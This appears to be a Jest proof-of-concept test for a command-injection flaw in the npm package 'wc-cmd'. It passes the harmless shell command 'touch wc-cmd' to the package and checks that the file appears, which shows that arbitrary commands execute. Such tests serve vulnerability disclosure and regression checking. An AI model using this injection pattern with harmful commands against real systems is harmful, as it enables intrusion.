test("Command Injection in wc-cmd", (done) => {
  expect.assertions(2);
  const a = require("wc-cmd");
  const fs = require("fs");
  const path = "./wc-cmd";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("touch wc-cmd", () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
